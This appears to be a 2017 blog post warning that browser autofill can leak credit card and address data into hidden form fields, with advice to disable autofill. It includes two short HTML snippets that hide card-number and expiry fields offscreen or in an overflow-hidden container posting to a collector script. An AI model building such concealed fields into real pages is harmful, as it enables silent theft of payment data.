---
Risk of Using Browser Autofill Feature"
---
<article class="post-listing post-17861 post type-post status-publish format-standard has-post-thumbnail hentry  tag-autofill tag-browser tag-feature tag-risk">
    <div class="post-inner">
        <span>Posted by: <a href="https://www.deepdotweb.com/author/filipjelic/" title="">Filip Jelic </a></span>
    <span>January 30, 2017</span>
    
    <span><a href="https://www.deepdotweb.com/2017/01/30/risk-of-using-browser-autofill-feature/#comments">1 Comment</a></span>
    </p>
    <div class="clear"></div>
    
    <p>Everybody hates filling out web forms so some browsers offer a handy Autofill feature to automate the job for you. Unfortunately, it&#8217;s handy for hackers, too.</p>
    <p>Hackers can abuse this feature to phish for your private information as well as credit card number, expiration date and cvc. Any website can have a lot of hidden fields that might get auto-filled and submitted without your knowledge. Take a quick look yourself:</p>
    <p>This proof-of-concept <a href="https://anttiviljami.github.io/browser-autofill-phishing/">demo website</a> consists of a simple online web form with just two fields: name and email. But what&#8217;s not visible are many out of sight fields, including the credit card information, phone number, organization, address, postal code, city etc. There&#8217;s more than one way of coding this, for example (linked demo site):</p>
    <p>&lt;form action=&#8221;https://httpbin.org/post&#8221; method=&#8221;post&#8221;&gt;</p>
    <p>&lt;p style=&#8221;margin-left:-500px&#8221;&gt;</p>
    <p>&lt;input type=&#8221;text&#8221; name=&#8221;cc_number&#8221;&gt;</p>
    <p>&lt;input type=&#8221;text&#8221; name=&#8221;cc_exp_month&#8221;&gt;</p>
    <p>&lt;input type=&#8221;text&#8221; name=&#8221;cc_exp_year&#8221;&gt;</p>
    <p>&lt;/p&gt;&lt;/form&gt;</p>
    <p>Notice the &#8220;margin-left:-500px&#8221; part that displays the text field out of the victim&#8217;s vision. This is not a regular type=&#8221;hidden&#8221; field.</p>
    <p>The same result can be achieved by creating a specially crafted container using &#8220;<a href="http://www.w3schools.com/cssref/pr_pos_overflow.asp">overflow:hidden</a>&#8221; attribute:</p>
    <p>&lt;form action=&#8221;collector.php&#8221; method=&#8221;post&#8221;&gt;</p>
    <p>&lt;div style=&#8221;overflow:hidden;height:35px;&#8221;&gt;</p>
    <p>&lt;input id=&#8221;00&#8243; autocomplete=&#8221;cc-number&#8221;&gt;</p>
    <p>&lt;input id=&#8221;01&#8243; autocomplete=&#8221;cc-exp-month&#8221;&gt;</p>
    <p>&lt;input id=&#8221;02&#8243; autocomplete=&#8221;cc-exp-year&#8221;&gt;</p>
    <p>&lt;/div&gt;&lt;/form&gt;</p>
    <p>These fields would also get auto-filled along with at least one visible, regular text field which is usually put in another container within the same form.</p>
    <p>On the plus side, this method alone cannot capture passwords saved in the browser because they&#8217;re tied to a specific domain, but that&#8217;s not going to comfort someone that lost their identity and banking information.</p>
    <p>Browsers vulnerable to the attack include Google Chrome, Apple Safari and Opera. On the other hand, if you use Mozilla Firefox or Tor, you don&#8217;t need to worry about this issue because Mozilla doesn&#8217;t support auto-filling multiple fields at once.</p>
    <p>Since this method was first published in 2013, Chrome&#8217;s only response was implementing a warning message when credit card information is being submitted over HTTP, I am not expecting a fix anytime soon. Fraudsters can easily obtain a SSL certificate for free so I recommend disabling Autofill feature in your browser.</p>
    <p>If you&#8217;re using Chrome, go to Settings -&gt; Show Advanced Settings (at the bottom) -&gt; uncheck Enable Autofill box to fill out web forms with a single click (under Passwords and Forms section).</p>
    </div>
    <a href="https://www.deepdotweb.com/tag/autofill/" rel="tag">autofill</a> <a href="https://www.deepdotweb.com/tag/browser/" rel="tag">browser</a> <a href="https://www.deepdotweb.com/tag/feature/" rel="tag">feature</a> <a href="https://www.deepdotweb.com/tag/risk/" rel="tag">risk</a></span> <span style="display:none" class="updated">2017-01-30</span>
    <div style="display:none" class="vcard author" itemprop="author" itemscope itemtype="http://schema.org/Person"><strong class="fn" itemprop="name"><a href="https://www.deepdotweb.com/author/filipjelic/" title="Posts by Filip Jelic" rel="author">Filip Jelic</a></strong></div>
    
